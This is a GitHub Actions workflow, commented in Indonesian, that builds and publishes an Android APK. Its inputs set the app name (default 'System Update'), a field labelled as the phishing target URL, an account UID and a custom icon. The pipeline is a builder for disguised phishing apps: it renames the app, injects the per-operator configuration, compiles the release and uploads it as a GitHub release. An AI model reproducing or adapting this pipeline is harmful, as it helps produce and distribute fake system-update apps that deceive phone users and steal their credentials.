name: Build Sync XxX APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        description: 'Nama Aplikasi'
        required: true
        default: 'System Update'
      target_url:
        description: 'URL Target (Phising)'
        required: true
        default: 'https://example.com'
      uid:
        description: 'UID Akun'
        required: true
        default: 'nexsus-xxxxxxx'
      icon_url:
        description: 'URL Icon (PNG/JPG)'
        required: false
        default: 'https://files.catbox.moe/0iq0n3.jpg'

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      actions: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Pillow & Requests
        run: pip install Pillow requests

      - name: Inject Config & Download Icon
        run: |
          # 1. Ganti Nama Aplikasi di strings.xml
          sed -i 's|<string name="app_name">.*</string>|<string name="app_name">${{ github.event.inputs.app_name }}</string>|g' app/src/main/res/values/strings.xml
          
          # 2. Bikin folder assets & tulis UID
          mkdir -p app/src/main/assets/
          echo '{"uid":"${{ github.event.inputs.uid }}"}' > app/src/main/assets/uid.json
          
          # 3. Download custom icon
          curl -L -o custom_icon.png "${{ github.event.inputs.icon_url }}"

      - name: Generate App Icons
        run: python3 generate_icons.py custom_icon.png

      - name: Setup Gradle Wrapper
        run: |
          curl -L -o gradle/wrapper/gradle-wrapper.jar \
            "https://github.com/gradle/gradle/raw/v8.4.0/gradle/wrapper/gradle-wrapper.jar"
          chmod +x gradlew

      - name: Build Release APK
        run: ./gradlew assembleRelease --no-daemon

      - name: Rename APK
        run: |
          mkdir -p output
          find app/build/outputs/apk/release/ -name "*.apk" | head -1 | xargs -I{} cp {} output/SyncXxX.apk

      - name: Create Release and Upload APK
        uses: softprops/action-gh-release@v1
        with:
          tag_name: build-${{ github.run_id }}
          name: "Build ${{ github.event.inputs.app_name }}"
          files: output/SyncXxX.apk
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
